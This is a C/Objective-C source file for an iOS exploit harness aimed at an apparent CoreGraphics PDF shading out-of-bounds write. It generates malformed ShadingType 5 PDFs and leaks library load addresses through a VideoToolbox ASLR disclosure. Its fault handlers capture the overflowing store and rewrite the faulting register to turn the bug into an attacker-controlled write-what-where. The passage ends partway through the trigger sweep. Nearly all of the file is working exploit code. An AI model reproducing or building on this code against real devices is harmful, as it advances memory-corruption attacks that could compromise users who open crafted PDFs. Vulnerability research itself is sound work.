// cg.m — CVE-2026-112611 ladder for the F1OOB harness.
//
// PDF ShadingType 5 with an /N vs /C0 array mismatch. CoreGraphics builds the
// shading sample function from /N but copies the whole /C0 and /C1 operand
// arrays, so the fill loop runs past the end of the function's output buffer.
// With /BitsPerCoordinate 32 every decoded sample is a double, which turns the
// runaway store into an 8-byte store of a value the PDF supplies.
//
// Stages, all in one process, each guarded by a sigsetjmp boundary:
//
//   CG-VT  VideoToolbox / H9 userland ASLR disclosure, plus a lazy force-load
//          through a real HEVC encode because iOS 27 loads the encoder late.
//   CG-1   trigger sweep: twelve dict geometries, observe-only handler. Records
//          si_addr, ESR WnR and the faulting instruction, then unwinds. Nothing
//          is mapped and no store is retried, so the sweep cannot corrupt the
//          parser's heap any further than the trigger already did.
//   CG-2   capture: re-run the winning geometry with the handler mapping the
//          fault page as 0xCC and returning, so the CPU retries the store. The
//          diff of the page is the OOB write, and the /C0 value in it is the
//          proof the write carries attacker-chosen data.
//   CG-3   redirect: decode the faulting STR, rewrite its base register to
//          point at a scratch page, return, and read back what landed there.
//          That is a write-what-where with a value the PDF chose.
//
// The handler never formats text and never touches CoreFoundation: it stores
// intel in globals and either returns to retry or siglongjmps out. All logging
// happens after the jump, in normal context.
//
// Build: linked into F1OOBPoC by Theos. Frameworks: CoreGraphics, CoreMedia,
// CoreVideo, VideoToolbox.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <math.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/ucontext.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/vm_region.h>
#include <mach-o/dyld.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>
#include <CoreMedia/CoreMedia.h>
#include <CoreVideo/CoreVideo.h>
#include <VideoToolbox/VideoToolbox.h>

extern kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address,
                                      mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
                                        mach_vm_size_t size);

static void (*g_log)(const char *) = NULL;

static void cg_logf(const char *fmt, ...) {
    if (!g_log) return;
    char buf[2048];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    g_log(buf);
}

// ============================================================================
// PDF builder
// ============================================================================

typedef struct { uint8_t *p; size_t n, cap; int err; } cgbuf;

static void cgb_init(cgbuf *b, size_t cap) {
    b->p = (uint8_t *)malloc(cap ? cap : 1);
    b->n = 0;
    b->cap = b->p ? (cap ? cap : 1) : 0;
    b->err = b->p ? 0 : -1;
}

static void cgb_free(cgbuf *b) {
    free(b->p);
    b->p = NULL; b->n = 0; b->cap = 0;
}

static void cgb_mem(cgbuf *b, const void *s, size_t l) {
    if (b->err) return;
    if (!b->p) { b->err = -1; return; }
    if (b->n + l > b->cap) { b->err = -2; return; }
    memcpy(b->p + b->n, s, l);
    b->n += l;
}

static void cgb_str(cgbuf *b, const char *s) { cgb_mem(b, s, strlen(s)); }

static void cgb_fmt(cgbuf *b, const char *fmt, ...) {
    char t[8192];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(t, sizeof(t), fmt, ap);
    va_end(ap);
    if (n < 0 || (size_t)n >= sizeof(t)) { b->err = -3; return; }
    cgb_mem(b, t, (size_t)n);
}

typedef struct { cgbuf *b; uint32_t acc; int bits; } cgbit;

static void cgbit_put(cgbit *w, uint64_t v, int width) {
    for (int i = width - 1; i >= 0; i--) {
        w->acc = (w->acc << 1) | (uint32_t)((v >> i) & 1ULL);
        if (++w->bits == 8) {
            uint8_t c = (uint8_t)w->acc;
            cgb_mem(w->b, &c, 1);
            w->acc = 0;
            w->bits = 0;
        }
    }
}

static void cgbit_flush(cgbit *w) {
    if (w->bits) {
        uint8_t c = (uint8_t)(w->acc << (8 - w->bits));
        cgb_mem(w->b, &c, 1);
    }
    w->acc = 0;
    w->bits = 0;
}

typedef struct {
    const char *name;
    int nc;         // components in the colour space
    int nfunc;      // /N in the function dictionary
    int bpc;        // /BitsPerCoordinate
    int bpc_c;      // /BitsPerComponent
    int color_bits; // bits packed per vertex for the colour operand
    int vpr;        // /VerticesPerRow
    int rows;       // rows of vertices, vpr * rows vertices total
    int c0count;    // entries in /C0 and /C1
    int decode_py;  // 1 = five-entry /Decode like the published PoC
} cgvar;

static const char *cg_cs_name(int nc) {
    if (nc == 1) return "/DeviceGray";
    if (nc == 3) return "/DeviceRGB";
    if (nc == 4) return "/DeviceCMYK";
    return NULL;
}

// Shortest decimal token that reads back as exactly the requested bits. The
// /C0 operands are PDF numbers, so a raw double has to survive a text round
// trip before the parser ever sees it.
static int cg_dbl_lit(uint64_t bits, char *out, size_t cap) {
    double d;
    memcpy(&d, &bits, 8);
    if (((bits >> 52) & 0x7FF) == 0x7FF) return -1;
    if (!isfinite(d)) return -1;
    char t[1400];
    int n = snprintf(t, sizeof(t), "%.1074f", d);
    if (n <= 0 || (size_t)n >= sizeof(t)) return -1;
    int dot = -1;
    for (int i = 0; i < n; i++) if (t[i] == '.') { dot = i; break; }
    if (dot >= 0) {
        int last = n - 1;
        while (last > dot && t[last] == '0') last--;
        if (last == dot) last--;
        n = last + 1;
        t[n] = 0;
    }
    if ((size_t)n >= cap) return -1;
    memcpy(out, t, (size_t)n + 1);
    double back = strtod(out, NULL);
    uint64_t bb;
    memcpy(&bb, &back, 8);
    if (bb != bits) return -2;
    return 0;
}

// Object layout, offsets and the 20-byte xref stride are fixed so that obj 6,
// the function dictionary, is the only object a harness has to rewrite.
static uint8_t *cg_build_pdf(const cgvar *v, uint64_t c0bits, uint64_t c1bits,
                             const char *lit_override, size_t *out_len,
                             char *err, size_t errcap) {
    if (out_len) *out_len = 0;
    const char *cs = cg_cs_name(v->nc);
    if (!cs) { snprintf(err, errcap, "bad nc=%d", v->nc); return NULL; }

    char lit0[1400], lit1[1400];
    if (lit_override) {
        snprintf(lit0, sizeof(lit0), "%s", lit_override);
        snprintf(lit1, sizeof(lit1), "%s", lit_override);
    } else {
        if (cg_dbl_lit(c0bits, lit0, sizeof(lit0)) != 0) {
            snprintf(err, errcap, "c0 literal");
            return NULL;
        }
        if (cg_dbl_lit(c1bits, lit1, sizeof(lit1)) != 0) {
            snprintf(err, errcap, "c1 literal");
            return NULL;
        }
    }

    int nv = v->vpr * v->rows;
    if (nv <= 0 || nv > 4000000) { snprintf(err, errcap, "bad vertex count"); return NULL; }

    size_t sbytes = ((size_t)nv * (size_t)(v->bpc * 2 + v->color_bits) + 7) / 8 + 8;
    cgbuf s;
    cgb_init(&s, sbytes);
    if (s.err) { snprintf(err, errcap, "stream alloc"); return NULL; }
    cgbit w = { &s, 0, 0 };
    for (int i = 0; i < nv; i++) {
        uint64_t xy = (uint64_t)(uint32_t)(0x10000000u + (uint32_t)i);
        cgbit_put(&w, xy, v->bpc);
        cgbit_put(&w, xy, v->bpc);
        cgbit_put(&w, 0, v->color_bits);
    }
    cgbit_flush(&w);
    if (s.err) { cgb_free(&s); snprintf(err, errcap, "stream overflow"); return NULL; }

    char dec[256];
    size_t dp = 0;
    if (v->decode_py) {
        dp += (size_t)snprintf(dec + dp, sizeof(dec) - dp, "[0 200 0 200 0 1]");
    } else {
        dp += (size_t)snprintf(dec + dp, sizeof(dec) - dp, "[0 200 0 200");
        for (int i = 0; i < v->nc && dp < sizeof(dec) - 8; i++)
            dp += (size_t)snprintf(dec + dp, sizeof(dec) - dp, " 0 1");
        dp += (size_t)snprintf(dec + dp, sizeof(dec) - dp, "]");
    }

    size_t cap = s.n + 8192 + 2 * (size_t)v->c0count * (strlen(lit0) + 2);
    cgbuf o;
    cgb_init(&o, cap);
    if (o.err) { cgb_free(&s); snprintf(err, errcap, "pdf alloc 0x%zx", cap); return NULL; }

    long off[7] = {0, 0, 0, 0, 0, 0, 0};
    cgb_str(&o, "%PDF-1.7\n%\xE2\xE3\xCF\xD3\n");
    off[1] = (long)o.n;
    cgb_str(&o, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
    off[2] = (long)o.n;
    cgb_str(&o, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
    off[3] = (long)o.n;
    cgb_str(&o, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
                "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
    off[4] = (long)o.n;
    cgb_str(&o, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
    off[5] = (long)o.n;
    cgb_fmt(&o, "5 0 obj\n<< /ShadingType 5 /ColorSpace %s /BitsPerCoordinate %d "
                "/BitsPerComponent %d /VerticesPerRow %d /Decode %s "
                "/Function 6 0 R /Length %zu >>\nstream\n",
            cs, v->bpc, v->bpc_c, v->vpr, dec, s.n);
    cgb_mem(&o, s.p, s.n);
    cgb_str(&o, "\nendstream\nendobj\n");
    off[6] = (long)o.n;
    cgb_fmt(&o, "6 0 obj\n<< /FunctionType 2 /Domain [0 1] /N %d /C0 [", v->nfunc);
    for (int i = 0; i < v->c0count; i++) cgb_fmt(&o, "%s%s", i ? " " : "", lit0);
    cgb_fmt(&o, "] /C1 [");
    for (int i = 0; i < v->c0count; i++) cgb_fmt(&o, "%s%s", i ? " " : "", lit1);
    cgb_fmt(&o, "] >>\nendobj\n");
    if (o.err) { cgb_free(&s); cgb_free(&o); snprintf(err, errcap, "obj overflow"); return NULL; }

    long xref = (long)o.n;
    cgb_str(&o, "xref\n0 7\n0000000000 65535 f \n");
    for (int i = 1; i <= 6; i++) cgb_fmt(&o, "%010ld 00000 n \n", off[i]);
    cgb_fmt(&o, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
    cgb_free(&s);
    if (o.err) {
        cgb_free(&o);
        snprintf(err, errcap, "xref overflow @%ld", xref);
        return NULL;
    }
    if (out_len) *out_len = o.n;
    return o.p;
}

// ============================================================================
// Fault machinery
// ============================================================================

enum { CGM_OFF = 0, CGM_OBSERVE = 1, CGM_MAP = 2, CGM_REDIR = 3 };

#define CG_MAXPAGES   32
#define CG_PAGE_SIZE  0x4000ULL
#define CG_REDIR_C0   0x430C6BF526340000ULL   // bits of double 1e15
#define CG_CANARY     0xA5A5A5A5A5A5A5A5ULL
#define CG_MAPFILL    0xCC

static volatile sig_atomic_t cg_mode = CGM_OFF;
static volatile sig_atomic_t cg_busy = 0;
static volatile sig_atomic_t cg_recursive = 0;
static volatile int      cg_hit = 0;
static volatile uintptr_t cg_far = 0;
static volatile uintptr_t cg_pc = 0;
static volatile uint32_t cg_insn = 0;
static volatile int      cg_wnr = -1;
static volatile int      cg_nmap = 0;
static volatile int      cg_mapfail = 0;
static volatile int      cg_livepage = 0;
static uint8_t * volatile cg_page[CG_MAXPAGES];
static volatile uintptr_t cg_pageaddr[CG_MAXPAGES];
static volatile uintptr_t cg_redir_target = 0;
static volatile int      cg_redir_decoded = 0;
static volatile int      cg_redir_kind = -1;
static volatile int      cg_redir_rn = -1;
static volatile int      cg_redir_isreg = -1;
static volatile long long cg_redir_imm = 0;
static volatile uintptr_t cg_redir_newbase = 0;
static sigjmp_buf cg_jb;

typedef kern_return_t (*cg_vr_fn_t)(vm_map_t, vm_address_t *, vm_size_t *,
                                    vm_region_flavor_t, vm_region_info_t,
                                    mach_msg_type_number_t *, mach_port_t *);

static cg_vr_fn_t g_cg_vr = NULL;

// vm_region_recurse is declared in the SDK but not exported by libsystem_kernel
// on iOS, so the region call is resolved at runtime.
static cg_vr_fn_t cg_region_fn(const char **nameOut) {
    static cg_vr_fn_t fn = NULL;
    static const char *name = NULL;
    if (!fn) {
        static const char *cands[3] = { "vm_region_64", "vm_region", "mach_vm_region" };
        for (int i = 0; i < 3 && !fn; i++) {
            void *p = dlsym(RTLD_DEFAULT, cands[i]);
            if (p) { fn = (cg_vr_fn_t)p; name = cands[i]; }
        }
    }
    if (nameOut) *nameOut = name;
    return fn;
}

// True when the page is inside a live mapping. A faulting page is normally a
// hole, but a PROT_NONE guard page faults too and must never be replaced.
//
// The primary oracle is a kernel-side read: vm_read_overwrite never takes a
// fault in-process, so it answers "is this page mapped" for any protection.
// vm_region is the fallback and also catches the case where the probe result
// is neither invalid-address nor success.
static int cg_page_is_live(uintptr_t page) {
    uint64_t probe = 0;
    vm_size_t got = 0;
    kern_return_t pr = vm_read_overwrite(mach_task_self(), (vm_address_t)page,
                                         sizeof(probe), (vm_address_t)&probe, &got);
    if (pr == KERN_SUCCESS || pr == KERN_PROTECTION_FAILURE) return 1;
    if (pr == KERN_INVALID_ADDRESS) return 0;

    if (!g_cg_vr) return 1;
    vm_address_t region = (vm_address_t)page;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t obj = MACH_PORT_NULL;
    kern_return_t kr = g_cg_vr(mach_task_self(), &region, &size,
                               VM_REGION_BASIC_INFO_64,
                               (vm_region_info_t)&info, &count, &obj);
    if (obj != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), obj);
    if (kr != KERN_SUCCESS) return 1;
    return (uintptr_t)region <= page;
}

// Address form of the faulting store. The base register has to be moved by a
// different amount for each one, because the store address is not always Xn.
//
//   OFF   address = Xn + imm        (unsigned offset, and unscaled STUR with Xn+imm9)
//   POST  address = Xn, then Xn += imm     (post-index: the store uses Xn untouched)
//   PRE   address = Xn + imm, then Xn = address
//   REG   address = Xn + (Xm << shift)
//
// iOS 26 emitted the immediate-offset form. iOS 27 emits post-indexed SIMD
// stores: the faulting word on 27.0.0 / T8140 is 0xfc008661, which decodes as
// str d1, [x19], #8 — size=11 (64-bit), V=1, bits25-24=00, opc=00, bit21=0,
// imm9=8, bits11-10=01, Rn=19, Rt=1. Missing that form is why the first
// redirect stage reported reg=-1.
enum { CG_AF_OFF = 0, CG_AF_POST = 1, CG_AF_PRE = 2, CG_AF_REG = 3 };

static int cg_decode_str(uint32_t insn, int *kind, int *rn,
                         long long *imm, int *rm, int *shift) {
    // unsigned offset, general (0x39) and SIMD&FP (0x3D): size << imm12
    if ((insn & 0x3F200000u) == 0x39000000u ||
        (insn & 0x3F200000u) == 0x3D000000u) {
        uint32_t sz = (insn >> 30) & 3u;
        *kind = CG_AF_OFF;
        *rn = (int)((insn >> 5) & 0x1Fu);
        *imm = (long long)((uint64_t)((insn >> 10) & 0xFFFu) << sz);
        return 0;
    }
    // size 111 V 00 opc 0 imm9 idx Rn Rt — unscaled, post-index, pre-index.
    // Bit 26 (V) is masked out: both the integer and the SIMD&FP encodings land
    // here, and 0x38000000 is the V=0 shape.
    if ((insn & 0x3B200000u) == 0x38000000u) {
        uint32_t idx = (insn >> 10) & 3u;
        int32_t i9 = (int32_t)((insn >> 12) & 0x1FFu);
        if (i9 & 0x100) i9 -= 0x200;
        *rn = (int)((insn >> 5) & 0x1Fu);
        *imm = (long long)i9;
        if (idx == 0u) { *kind = CG_AF_OFF;  return 0; }
        if (idx == 1u) { *kind = CG_AF_POST; return 0; }
        if (idx == 3u) { *kind = CG_AF_PRE;  return 0; }
        return -1;   // idx == 2 is the register form, which sets bit 21
    }
    // register offset, SIMD&FP: size 111 1 00 opc 1 Rm option S 10 Rn Rt
    if ((insn & 0x3F000000u) == 0x3C000000u && ((insn >> 10) & 3u) == 2u) {
        uint32_t option = (insn >> 13) & 7u;
        uint32_t S = (insn >> 12) & 1u;
        if (option == 3 && S == 1) {
            *kind = CG_AF_REG;
            *rn = (int)((insn >> 5) & 0x1Fu);
            *rm = (int)((insn >> 16) & 0x1Fu);
            *shift = 3;
            return 0;
        }
    }
    return -1;
}

static void cg_fault(int sig, siginfo_t *si, void *uctx) {
    if (cg_busy) {
        cg_recursive = 1;
        siglongjmp(cg_jb, 0x51);
    }
    if (cg_mode == CGM_OFF) {
        signal(sig, SIG_DFL);
        raise(sig);
        return;
    }
    cg_busy = 1;

    ucontext_t *uc = (ucontext_t *)uctx;
    uintptr_t far = (uintptr_t)(si ? si->si_addr : 0);
    uintptr_t pc = 0;
    int wnr = -1;
    if (uc && uc->uc_mcontext) {
        pc = (uintptr_t)uc->uc_mcontext->__ss.__pc;
        uint32_t esr = (uint32_t)uc->uc_mcontext->__es.__esr;
        wnr = (int)((esr >> 6) & 1u);
    }

    cg_hit++;
    if (cg_hit == 1) {
        cg_far = far;
        cg_pc = pc;
        cg_wnr = wnr;
        cg_insn = pc ? *(volatile uint32_t *)pc : 0;
    }

    if (cg_mode == CGM_OBSERVE) {
        cg_busy = 0;
        siglongjmp(cg_jb, 1);
    }

    if (cg_mode == CGM_MAP) {
        uintptr_t page = far & ~(CG_PAGE_SIZE - 1ULL);
        int known = 0;
        for (int i = 0; i < cg_nmap; i++) if (cg_pageaddr[i] == page) { known = 1; break; }
        if (!known) {
            if (cg_nmap >= CG_MAXPAGES) { cg_busy = 0; siglongjmp(cg_jb, 1); }
            if (cg_page_is_live(page)) {
                // Retrying would fault on the same live page forever, so the
                // stage ends here instead of spinning.
                cg_livepage++;
                cg_busy = 0;
                siglongjmp(cg_jb, 1);
            } else {
                uint8_t *b = (uint8_t *)mmap((void *)page, CG_PAGE_SIZE,
                                             PROT_READ | PROT_WRITE,
                                             MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);
                if (b == MAP_FAILED) {
                    mach_vm_address_t ta = (mach_vm_address_t)page;
                    kern_return_t kr = mach_vm_allocate(mach_task_self(), &ta,
                                                        CG_PAGE_SIZE, VM_FLAGS_FIXED);
                    if (kr != KERN_SUCCESS) { cg_mapfail++; b = NULL; }
                    else b = (uint8_t *)ta;
                }
                if (!b) { cg_busy = 0; siglongjmp(cg_jb, 1); }
                memset(b, CG_MAPFILL, CG_PAGE_SIZE);
                cg_page[cg_nmap] = b;
                cg_pageaddr[cg_nmap] = page;
                cg_nmap++;
            }
        }
        cg_busy = 0;
        return;
    }

    if (cg_mode == CGM_REDIR) {
        if (cg_redir_decoded) { cg_busy = 0; siglongjmp(cg_jb, 1); }
        int kind = CG_AF_OFF, rn = -1, rm = -1, shift = 0;
        long long imm = 0;
        if (!uc || !uc->uc_mcontext || pc == 0 ||
            cg_decode_str(*(volatile uint32_t *)pc, &kind, &rn, &imm, &rm, &shift) != 0) {
            cg_busy = 0;
            siglongjmp(cg_jb, 1);
        }
        uintptr_t nb;
        if (kind == CG_AF_REG) {
            uintptr_t rmv = (uintptr_t)uc->uc_mcontext->__ss.__x[rm];
            nb = cg_redir_target - (rmv << shift);
        } else if (kind == CG_AF_POST) {
            // The store reads Xn before the writeback, so Xn itself is the address.
            nb = cg_redir_target;
        } else {
            // Pre-index and every offset form: address is Xn + imm.
            nb = cg_redir_target - (uintptr_t)imm;
        }
        uc->uc_mcontext->__ss.__x[rn] = nb;
        cg_redir_decoded = 1;
        cg_redir_kind = kind;
        cg_redir_isreg = (kind == CG_AF_REG) ? 1 : 0;
        cg_redir_rn = rn;
        cg_redir_imm = imm;
        cg_redir_newbase = nb;
        cg_busy = 0;
        return;
    }

    cg_busy = 0;
    siglongjmp(cg_jb, 1);
}

// 1 = render finished, 0 = handler unwound it, -1 = setup failed
static int cg_render_file(const char *path, char *err, size_t errcap) {
    CGDataProviderRef prov = CGDataProviderCreateWithFilename(path);
    if (!prov) { snprintf(err, errcap, "provider"); return -1; }
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithProvider(prov);
    CGDataProviderRelease(prov);
    if (!doc) { snprintf(err, errcap, "document"); return -1; }

    CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
    if (!page) { CGPDFDocumentRelease(doc); snprintf(err, errcap, "page"); return -1; }

    CGRect r = CGPDFPageGetBoxRect(page, kCGPDFMediaBox);
    size_t w = (size_t)r.size.width, h = (size_t)r.size.height;
    if (w < 16 || h < 16 || w > 4096 || h > 4096) { w = 200; h = 200; }

    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(NULL, w, h, 8, 0, cs,
                                             (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    if (!ctx) { CGPDFDocumentRelease(doc); snprintf(err, errcap, "context"); return -1; }

    int done = 0;
    if (sigsetjmp(cg_jb, 1) == 0) {
        CGContextDrawPDFPage(ctx, page);
        done = 1;
    }
    cg_mode = CGM_OFF;
    cg_busy = 0;
    // A render unwound by the handler leaves the parser half torn down with its
    // objects still reachable from internal caches, so they are leaked rather
    // than freed under a corrupted reader.
    if (done) {
        CGContextRelease(ctx);
        CGPDFDocumentRelease(doc);
    }
    return done;
}

static int cg_write_file(const uint8_t *p, size_t n, const char *path) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t w = fwrite(p, 1, n, f);
    fclose(f);
    return w == n ? 0 : -1;
}

// ============================================================================
// CG-VT — VideoToolbox / H9 userland ASLR disclosure
// ============================================================================

static int cg_vt_scan(const char *tag, uint32_t from) {
    uint32_t n = _dyld_image_count();
    int hits = 0;
    for (uint32_t i = from; i < n; i++) {
        const char *nm = _dyld_get_image_name(i);
        if (!nm) continue;
        if (strstr(nm, "H9") || strstr(nm, "VideoEncoders") || strstr(nm, "AVE")) {
            cg_logf("[VT] %s img[%u] %s hdr=0x%llx slide=0x%llx", tag, i, nm,
                    (unsigned long long)(uintptr_t)_dyld_get_image_header(i),
                    (unsigned long long)(uintptr_t)_dyld_get_image_vmaddr_slide(i));
            hits++;
        }
    }
    cg_logf("[VT] %s images=%u encHits=%d", tag, n, hits);
    return hits;
}

static void cg_vt_stage(void) {
    uint32_t n0 = _dyld_image_count();
    int hits = cg_vt_scan("boot", 0);
    if (hits > 0) return;

    VTCompressionSessionRef s = NULL;
    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1920, 1080,
                                             kCMVideoCodecType_HEVC, NULL, NULL,
                                             NULL, NULL, NULL, &s);
    cg_logf("[VT] hevc create st=%d session=%p", (int)st, (void *)s);
    if (!s) return;

    OSStatus ps = VTCompressionSessionPrepareToEncodeFrames(s);
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, NULL, &pb);
    OSStatus es = -1;
    if (pb) {
        VTEncodeInfoFlags fl = 0;
        es = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(1, 14400000),
                                             CMTimeMake(1, 30), NULL, NULL, &fl);
    }
    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    cg_logf("[VT] prepare=%d pixelbuf=%p encode=%d", (int)ps, (void *)pb, (int)es);

    cg_vt_scan("after", n0);

    if (pb) CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(s);
    CFRelease(s);
}

// ============================================================================
// Stages
// ============================================================================

#define CG_NVARS 12

static const cgvar g_cg_vars[CG_NVARS] = {
    // published PoC geometry: 8-bit colour operand, five-entry /Decode
    { "A_poc",   4, 1, 32, 8,  8, 136, 256, 256, 1 },
    // same stream, spec-shaped /Decode for four components
    { "B_spec",  4, 1, 32, 8, 32, 136, 256, 256, 0 },
    // /N follows the colour space, /C0 still 64x longer than needed
    { "C_n4",    4, 4, 32, 8, 32, 136, 256, 256, 0 },
    // short array and short /N: control, must not fault
    { "D_ctl",   4, 4, 32, 8, 32, 136, 256,   4, 0 },
    // RGB space, 8-bit operand
    { "E_rgb",   3, 1, 32, 8,  8, 136, 256, 256, 0 },
    // 16-bit coordinates with a 256-entry array
    { "F_c16",   4, 1, 16, 8,  8, 136, 256, 256, 1 },
    // 128 rows, the shape the CFData harness uses
    { "H_r128",  4, 1, 32, 8,  8, 136, 128, 128, 1 },
    // Overflow-length ladder: /C0 keeps its 1024 entries, the stream shrinks.
    // The vertex count sets how many times the sample function is evaluated, so
    // this separates "one call copies 1024 doubles" from "every vertex copies
    // them again". A single vertex that still faults means the damage is inside
    // one evaluation; small streams that survive mean the overflow accumulates.
    { "K_v1",    4, 1, 32, 8,  8,   1,   1,1024, 1 },
    { "K_v4",    4, 1, 32, 8,  8,   2,   2,1024, 1 },
    { "K_v16",   4, 1, 32, 8,  8,   4,   4,1024, 1 },
    { "K_v64",   4, 1, 32, 8,  8,   8,   8,1024, 1 },
    // full stream, 34816 vertices. Faults on 27.0.0, so it goes last: the sweep
    // stops here and everything above it gets measured first.
    { "G_1024",  4, 1, 32, 8,  8, 136, 256,1024, 1 },
};

// Builder entry point for the other translation units. Returns a malloc'd PDF
// with the published /C0 values; caller frees. NULL when the name is unknown or
// the buffer could not be allocated.
uint8_t *cg_pdf_build(const char *name, size_t *out_len) {
    for (int i = 0; i < CG_NVARS; i++) {
        if (strcmp(g_cg_vars[i].name, name) != 0) continue;
        char err[128] = {0};
        return cg_build_pdf(&g_cg_vars[i], 0x3FF0000000000000ULL,
                            0x3FF0000000000000ULL, NULL, out_len, err, sizeof(err));
    }
    if (out_len) *out_len = 0;
    return NULL;
}

// vm_read_overwrite reports failure as a return code instead of raising SIGSEGV,
// so a scan can touch memory that may or may not be mapped without arming the
// fault handler again.
static int cg_safe_read(uintptr_t addr, void *dst, size_t n) {
    vm_size_t got = 0;
    kern_return_t kr = vm_read_overwrite(mach_task_self(), (vm_address_t)addr,
                                         (vm_size_t)n, (vm_address_t)dst, &got);
    return (kr == KERN_SUCCESS && got == n) ? 0 : -1;
}

// Walk backwards from the fault address through the runaway fill. Every word
// matching the /C0 value is a slot the render wrote; the first word that does
// not match is the start of whatever object sits before the overwritten block.
// owned tells us how many bytes of the neighbouring region the render owned
// before it ran off the end.
static void cg_tail_scan(uintptr_t far) {
    if (!far) return;
    uint64_t w = 0;
    uintptr_t p = far;
    int owned = 0;
    while (owned < 65536) {
        if (p < 8 || cg_safe_read(p - 8, &w, 8) != 0) break;
        if (w != CG_REDIR_C0) break;
        p -= 8;
        owned++;
    }
    cg_logf("[CGT] tail far=0x%llx owned=%d bytes below the end",
            (unsigned long long)far, owned * 8);
    for (int i = 0; i < 4 && p >= 8; i++) {
        uint64_t b = 0;
        uintptr_t a = p - 8;
        if (cg_safe_read(a, &b, 8) != 0) {
            cg_logf("[CGT]   -0x%llx unreadable", (unsigned long long)(far - a));
            break;
        }
        cg_logf("[CGT]   -0x%llx: %016llx", (unsigned long long)(far - a),
                (unsigned long long)b);
        p = a;
    }
}

// ---------------------------------------------------------------------------
// Guarded call. Runs a block under a SIGSEGV/SIGBUS handler that unwinds back
// here instead of killing the process. jb.m uses it to push hostile geometry
// through renderers that live in this address space without taking the harness
// down when one of them eats the store.
// ---------------------------------------------------------------------------

static sigjmp_buf cg_guard_jb;
static volatile int cg_guard_active = 0;

static void cg_guard_fault(int sig, siginfo_t *si, void *uc) {
    (void)sig; (void)si; (void)uc;
    if (cg_guard_active) siglongjmp(cg_guard_jb, 1);
    _exit(139);
}

// Returns 0 when the block ran to completion, 1 when it faulted.
int cg_guard_call(void (^blk)(void));

int cg_guard_call(void (^blk)(void)) {
    if (!blk) return -1;
    struct sigaction sa, oldsegv, oldbus;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = cg_guard_fault;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    int haveBus = (sigaction(SIGBUS, &sa, &oldbus) == 0);
    if (sigaction(SIGSEGV, &sa, &oldsegv) != 0) {
        if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
        return -1;
    }
    int fault = 0;
    cg_guard_active = 1;
    if (sigsetjmp(cg_guard_jb, 1) == 0) {
        blk();
    } else {
        fault = 1;
    }
    cg_guard_active = 0;
    sigaction(SIGSEGV, &oldsegv, NULL);
    if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
    return fault;
}

void cg_section(void (*logcb)(const char *)) {
    g_log = logcb;
    cg_logf("[CG] === CVE-2026-112611 ladder ===");

    const char *fnName = NULL;
    g_cg_vr = cg_region_fn(&fnName);
    cg_logf("[CG] regionFn=%s", fnName ? fnName : "none");

    cg_vt_stage();

    const cgvar *vars = g_cg_vars;
    const int nvars = CG_NVARS;

    struct sigaction sa, oldsegv, oldbus;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = cg_fault;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGSEGV, &sa, &oldsegv) != 0) {
        cg_logf("[CG] sigaction SEGV failed");
        return;
    }
    int haveBus = (sigaction(SIGBUS, &sa, &oldbus) == 0);
    if (!haveBus) cg_logf("[CG] sigaction BUS failed");

    const char *home = getenv("HOME");
    if (!home || !*home) home = "/tmp";
    char path[1024];
    snprintf(path, sizeof(path), "%s/Documents/cve_2026_112611.pdf", home);

    int win = -1;
    char winName[32] = "none";

    // ---- CG-1: trigger sweep ----
    for (int i = 0; i < nvars; i++) {
        char err[128] = {0};
        size_t len = 0;
        uint8_t *pdf = cg_build_pdf(&vars[i], 0x3FF0000000000000ULL,
                                    0x3FF0000000000000ULL, NULL, &len, err, sizeof(err));
        if (!pdf) { cg_logf("[CGV] %s build FAILED: %s", vars[i].name, err); continue; }
        if (cg_write_file(pdf, len, path) != 0) {
            cg_logf("[CGV] %s write FAILED", vars[i].name);
            free(pdf);
            continue;
        }
        free(pdf);

        cg_mode = CGM_OBSERVE;
        cg_hit = 0; cg_far = 0; cg_pc = 0; cg_insn = 0; cg_wnr = -1;
        cg_recursive = 0;
        int done = cg_render_file(path, err, sizeof(err));
        cg_mode = CGM_OFF;

